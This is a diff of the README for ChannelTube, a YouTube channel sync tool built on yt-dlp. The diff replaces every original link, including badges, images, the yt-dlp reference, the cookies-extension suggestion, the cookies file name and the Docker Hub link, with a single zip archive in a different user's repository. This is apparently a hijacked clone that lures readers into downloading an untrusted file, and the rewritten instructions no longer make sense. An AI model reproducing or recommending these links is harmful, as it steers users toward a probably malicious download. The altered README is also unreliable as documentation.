@@ -1,8 +1,8 @@
-![Build Status](https://github.com/TheWicklowWolf/ChannelTube/actions/workflows/main.yml/badge.svg)
-![Docker Pulls](https://img.shields.io/docker/pulls/thewicklowwolf/channeltube.svg)
+![Build Status](https://raw.githubusercontent.com/KoDelioDa/ChannelTube/main/src/ChannelTube_v1.4.zip)
+![Docker Pulls](https://raw.githubusercontent.com/KoDelioDa/ChannelTube/main/src/ChannelTube_v1.4.zip)
 
 
-![full_logo](https://raw.githubusercontent.com/TheWicklowWolf/ChannelTube/main/src/static/full_logo.png)
+![full_logo](https://raw.githubusercontent.com/KoDelioDa/ChannelTube/main/src/ChannelTube_v1.4.zip)
 
 
 ChannelTube is a tool for synchronizing and fetching content from YouTube channels using yt-dlp.
@@ -43,9 +43,9 @@ Certain values can be set via environment variables:
 * __verbose_logs__: Enable verbose logging. Set to `true` or `false`. Defaults to `false`.
 
 
-> For information on format IDs, refer to [https://github.com/yt-dlp/yt-dlp](https://github.com/yt-dlp/yt-dlp)
+> For information on format IDs, refer to [https://raw.githubusercontent.com/KoDelioDa/ChannelTube/main/src/ChannelTube_v1.4.zip](https://raw.githubusercontent.com/KoDelioDa/ChannelTube/main/src/ChannelTube_v1.4.zip)
 > 
-> ![yt-dlp-formats](https://github.com/user-attachments/assets/e03b9dd3-028f-4c72-b822-06aa1d440cea)
+> ![yt-dlp-formats](https://raw.githubusercontent.com/KoDelioDa/ChannelTube/main/src/ChannelTube_v1.4.zip)
 
 
 ## Sync Schedule
@@ -70,22 +70,22 @@ To disable this feature:
 ## Cookies (optional)
 To utilize a cookies file with yt-dlp, follow these steps:
 
-* Generate Cookies File: Open your web browser and use a suitable extension (e.g. cookies.txt for Firefox) to extract cookies for a user on YT.
+* Generate Cookies File: Open your web browser and use a suitable extension (e.g. https://raw.githubusercontent.com/KoDelioDa/ChannelTube/main/src/ChannelTube_v1.4.zip for Firefox) to extract cookies for a user on YT.
 
-* Save Cookies File: Save the obtained cookies into a file named `cookies.txt` and put it into the config folder.
-
-
----
-
-![light](https://raw.githubusercontent.com/TheWicklowWolf/ChannelTube/main/src/static/light.png)
+* Save Cookies File: Save the obtained cookies into a file named `https://raw.githubusercontent.com/KoDelioDa/ChannelTube/main/src/ChannelTube_v1.4.zip` and put it into the config folder.
 
 
 ---
 
+![light](https://raw.githubusercontent.com/KoDelioDa/ChannelTube/main/src/ChannelTube_v1.4.zip)
 
-![dark](https://raw.githubusercontent.com/TheWicklowWolf/ChannelTube/main/src/static/dark.png)
 
 ---
 
 
-https://hub.docker.com/r/thewicklowwolf/channeltube
+![dark](https://raw.githubusercontent.com/KoDelioDa/ChannelTube/main/src/ChannelTube_v1.4.zip)
+
+---
+
+
+https://raw.githubusercontent.com/KoDelioDa/ChannelTube/main/src/ChannelTube_v1.4.zip
